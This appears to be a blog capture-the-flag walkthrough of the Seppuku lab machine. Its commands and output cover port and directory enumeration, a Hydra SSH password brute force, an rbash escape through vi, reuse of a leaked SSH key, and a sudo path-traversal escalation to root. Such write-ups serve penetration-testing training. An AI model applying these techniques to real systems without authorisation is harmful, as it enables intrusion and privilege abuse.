---
layout: post
author: H4
---

[Details](https://www.vulnhub.com/entry/seppuku-1,484/)  
This box was customized by Offensive Security and integrated in the 'proving grounds' lab.  
In the following you see the solution of the 'proving grounds' version.  

# enumeration
Performing a simple `nmap` scan to identify the attack surface of the target.

## nmap
```bash
$ nmap -Pn -p- -sV 192.168.153.90
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-08 16:03 EST
Nmap scan report for 192.168.153.90
Host is up (0.10s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http        nginx 1.14.2
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
7080/tcp open  ssl/empowerid LiteSpeed
7601/tcp open  http          Apache httpd 2.4.38 ((Debian))
8088/tcp open  http        LiteSpeed httpd
Service Info: Host: SEPPUKU; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.02 seconds
```

## security quick checks
> `ftp` (port 21): no anonymous access allowed
> `ssh` (port 22): no weak passwords used for authentication or `root` access disabled
> web server (port 80): `htaccess` protected
> samba share (port 139, 445): no shares
> web server (port 8088): 'web console' (no exploit available)
> port 7080: no reaction
> web server (port 7601): looks like web server on port 8088 at first...
{: .prompt-danger }

## closer look at port 7601
```bash
$ gobuster dir -u http://192.168.153.90:7601/ -w /usr/share/wordlists/dirb/common.txt -t 5 -x php,txt,html -b 404,403
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.153.90:7601/
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
2022/02/08 16:25:29 Starting gobuster in directory enumeration mode
===============================================================
/a                    (Status: 301) [Size: 319] [--> http://192.168.153.90:7601/a/]
/b                    (Status: 301) [Size: 319] [--> http://192.168.153.90:7601/b/]
/c                    (Status: 301) [Size: 319] [--> http://192.168.153.90:7601/c/]
/ckeditor             (Status: 301) [Size: 326] [--> http://192.168.153.90:7601/ckeditor/]
/d                    (Status: 301) [Size: 319] [--> http://192.168.153.90:7601/d/]       
/database             (Status: 301) [Size: 326] [--> http://192.168.153.90:7601/database/]
/e                    (Status: 301) [Size: 319] [--> http://192.168.153.90:7601/e/]       
/f                    (Status: 301) [Size: 319] [--> http://192.168.153.90:7601/f/]       
/h                    (Status: 301) [Size: 319] [--> http://192.168.153.90:7601/h/]       
/index.html           (Status: 200) [Size: 171]                                           
/index.html           (Status: 200) [Size: 171]                                           
/keys                 (Status: 301) [Size: 322] [--> http://192.168.153.90:7601/keys/]    
/production           (Status: 301) [Size: 328] [--> http://192.168.153.90:7601/production/]
/q                    (Status: 301) [Size: 319] [--> http://192.168.153.90:7601/q/]         
/r                    (Status: 301) [Size: 319] [--> http://192.168.153.90:7601/r/]         
/secret               (Status: 301) [Size: 324] [--> http://192.168.153.90:7601/secret/]    
/t                    (Status: 301) [Size: 319] [--> http://192.168.153.90:7601/t/]         
/w                    (Status: 301) [Size: 319] [--> http://192.168.153.90:7601/w/]         
                                                                                            
===============================================================
2022/02/08 16:32:14 Finished
===============================================================
```

> The folders `keys` and `secret` sound interesting 
{: .prompt-info }

### folder `keys`
- `private`
- `private.bak`

### folder `secret`s
- `hostname`: seppuku
- `passwd.bak`: `passwd` file backup
- `shadow.bak`: `shadow` file backup
- `password.lst`: `password` list

---

# exploitation

## make use of public information
> `private` and `private.bak` keys unfortunately can not be used to log in into the machine as `root` or `seppuku` (`hostname`) via `ssh`.
{: .prompt-danger }

> `passwd.bak` and `shadow.bak` accounts are useless too.
{: .prompt-danger }

Now we have only the files `password.lst` and `hostname` left which maybe can be used in some kind of brute force attack.  

> Performing a brute force attack with the provided `password.lst` and username `root` does not work.
{: .prompt-danger }

> Testing the `hostname` as the username in combination wiht `password.lst` in a brute force attack might be more fruitful.
{: .prompt-info }

## hydra
```bash
$ hydra -l seppuku -P list.lst 192.168.153.90 ssh                          
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-02-08 16:46:30
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 92 login tries (l:1/p:92), ~6 tries per task
[DATA] attacking ssh://192.168.153.90:22/
[22][ssh] host: 192.168.153.90   login: seppuku   password: eeyoree
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-02-08 16:46:50
```
> Yes! Logging in with `seppuku:eeyoree` seems to work.
{: .prompt-info }

---

# post exploitation

## ssh login and first flag

```bash
$ ssh seppuku@192.168.153.90
seppuku@192.168.153.90's password: 
Linux seppuku 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
seppuku@seppuku:~$ ls
local.txt
seppuku@seppuku:~$ cat local.txt 
0******************************e
```

When trying to further inspect the system we see that we are jailed with `rbash` restricts our access.

## `rbash` (jail) escape
```bash
$ vi
```

in `vi`
```
:set shell=/bin/sh
:shell
```

Now we can investigate the system further.

## privilege escalation

In the home folder of `seppuku` is the password for user `samurai`:
```bash
$ cat .passwd
12345685213456!@!@A
```

Login via `ssh` as `samurai` without a restricted shell
```bash
$ ssh samurai@192.168.52.90 "bash --noprofile"
samurai@192.168.52.90's password: 
Linux seppuku 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
samurai@seppuku:~$ whoami
samurai
```

Check if we can execute commands as a super user.
```bash
samurai@seppuku:/home$ sudo -l
Matching Defaults entries for samurai on seppuku:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User samurai may run the following commands on seppuku:
    (ALL) NOPASSWD: /../../../../../../home/tanto/.cgi_bin/bin /tmp/*
```

> The executable `/home/tanto/.cgi_bin/bin` is not available.
{: .prompt-danger }

So if we can place an executable in the `tanto` home folder in the way it is specified above we can escalate to root with the user `samurai`.  
If we remember what we already collected about this machine the leaked `ssh` private keys come to our mind. So far we were not able to use them, but it might be a good idea to test if they are assigned to the user `tanto`.

Trying to log in with `private.bak` as user `tanto` via `ssh`.
```bash
$ ssh -i private.bak tanto@192.168.52.90 "bash --noprofile"
whoami
tanto
```

> Yay it worked!
{: .prompt-info }

Now lets create a link to the `bash` binary at the path specified above.
```bash
cd /home/tanto
mkdir .cgi_bin
chmod 777 .cgi_bin
cd .cgi_bin
echo "/bin/bash" > bin
chmod 777 bin
chmod +x bin
```

Switch back to user `samurai` and escalate to `root`
```bash
samurai@seppuku:~$ whoami
samurai
samurai@seppuku:/home$ sudo -l
Matching Defaults entries for samurai on seppuku:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User samurai may run the following commands on seppuku:
    (ALL) NOPASSWD: /../../../../../../home/tanto/.cgi_bin/bin /tmp/*
samurai@seppuku:/home/tanto/.cgi_bin$ sudo /../../../../../../home/tanto/.cgi_bin/bin /tmp/*
root@seppuku:/home/tanto/.cgi_bin# whoami
root
```

> Root! Root!
{: .prompt-info }

## get second flag

```bash
root@seppuku:/home/tanto/.cgi_bin# cd /root
root@seppuku:~# ls
proof.txt  root.txt
root@seppuku:~# cat proof.txt
9******************************4
```

Pwned! <@:-) 
